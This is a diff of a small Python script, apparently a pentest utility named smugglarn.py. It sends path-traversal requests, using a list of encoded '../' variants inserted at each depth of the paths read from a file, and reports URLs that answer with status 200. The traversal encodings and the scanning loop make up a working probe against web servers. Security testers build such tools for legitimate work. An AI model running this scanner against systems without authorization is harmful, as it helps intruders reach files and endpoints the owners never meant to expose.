@@ -1,9 +1,57 @@
 #!/usr/bin/python3
-import requests
+import requests, sys, getopt, os.path
 
-r = requests.get('http://127.0.0.1:8000/test/../test')
-print(r.text)
+travenc = ["../", "%2e./", ".%2e/", "%2e.%2f", ".%2e%2f", "..%2f", "%2e%2e%2f"]
 
-# Encodings - add orange stuff
-dot = ['.','%2e','%u002e']
-slash = ['/','%2f','%u002f']
+def send_requests_per_path(base, path):
+    path_comp = path.split('/')[1:]
+    org_req = requests.get(base+path[1:])
+    org_resp_code = org_req.status_code
+
+    for inj_point in range(len(path_comp)):
+        for trav in travenc:
+            traversal = trav*(inj_point+1)
+            url=base+'/'.join(path_comp[:inj_point+1])+'/'+traversal+path[1:]
+            r = requests.get(url)
+            if r.status_code == 200:
+                print(str(r.status_code) + ": " + url)
+
+def print_help():
+    help_text = '''Usage: smugglarn.py -u <base_url> -p <paths_file>'''
+    print(help_text)
+
+def main(argv):
+    baseurl = ''
+    endpoint = ''
+    method = ''
+    paths_file = ''
+    travmethod = ''
+    proxy = ''
+    try:
+        opts, args = getopt.getopt(argv,"hu:p:")
+    except getopt.GetoptError:
+        print_help()
+        sys.exit(2)
+    for opt, arg in opts:
+        if opt == '-h':
+            print_help()
+        elif opt == '-u':
+            baseurl = arg
+        elif opt == '-p':
+            paths_file = arg
+            if not os.path.exists(paths_file):
+                print("File not found: " + paths_file)
+                sys.exit(2)
+
+    if baseurl == '' or paths_file == '':
+        print_help()
+        sys.exit(2)
+
+    pf = open(paths_file)
+    for line in pf:
+        send_requests_per_path(baseurl, line[:-1])
+    
+
+if __name__ == "__main__":
+    main(sys.argv[1:])
+
